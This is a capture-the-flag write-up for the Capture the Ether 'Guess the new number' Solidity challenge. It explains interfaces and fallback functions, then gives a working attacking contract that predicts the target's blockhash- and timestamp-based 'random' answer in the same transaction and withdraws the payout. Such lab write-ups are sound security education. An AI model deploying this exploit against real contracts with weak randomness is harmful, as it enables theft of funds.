# Guess the new number

## Required Concepts

This puzzle borrowed many concepts from prior challenges. The puzzle generates a new ```answer``` value each time a guess is made by calling the ```guess``` function. With the source file we are able to determine the source of the puzzle's entropy. This entropy is a result of the same hashed values observed in ```Guess the random number```. The only difference is that this answer value isn't a static value anymore.

To solve this puzzle, we will write a solidity contract that has the ability to interface and send messages to our challenge contract. This way, we will be able to generate a value at the same time we make our function call using the same sources of entropy as our target contract.

A Solidity ```interface``` is an abstract contract that is included for the Solidity compiler. It includes functions without their bodies so that other contracts can instantiate the the interfaced contract and call its functions. We can denote an interface by replacing the ```contract``` declaration key word with ```interface```.

For a contract to receive ```ether```, it must have a ```fallback function``` that has a ```payable``` modifier. A ```fallback function``` is a nameless function that has no arguments. Our solution to this puzzle will incorporate a ```fallback function```. For more information, read the docs: https://solidity.readthedocs.io/en/v0.4.21/contracts.html?highlight=fallback%20function

## Challenge

Source: https://capturetheether.com/challenges/lotteries/guess-the-new-number/

>The number is now generated on-demand when a guess is made.

```
pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
```

## Solution

The following Solidity contract can be interpreted as our 'attacking' contract:

```
pragma solidity ^0.4.24;

// recreate hollow version of the contract and function to interact with
// so no errors show up in remix and so that it will compile.
interface GuessTheNewNumberChallenge {
    function guess(uint8 n) public payable;
}

contract pull {
    address owner;

    // instantiate
    GuessTheNewNumberChallenge public guessChallenge;

    // establish ownership of attack contract at deployment transaction
    constructor() public {
        owner = msg.sender;
    }

    // step 1: find contract address of vulnerable contract and input here
    function GuessTheNewNumberChallengePull(address _guessChal) public {
        guessChallenge = GuessTheNewNumberChallenge(_guessChal);
    }

    // step 2: send 1 ether with this transaction
    // function has to be payable to allow us to add msg.value to the txn
    // ()() where first parenthesis is msg.value and second is (arg1, arg2, etc)
    // https://ethereum.stackexchange.com/questions/9705/how-can-you-call-a-payable-function-in-another-contract-with-arguments-and-send
    function pullGuess() public payable {
        uint8 n = uint8(keccak256(blockhash(block.number - 1), now));
        guessChallenge.guess.value(msg.value)(n);
    }

    // step 4: withdraw funds from pull contract
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    // step 3: funds are automatically sent to
    // fallback function from vulnerable contract
    function() public payable {

    }

}
```
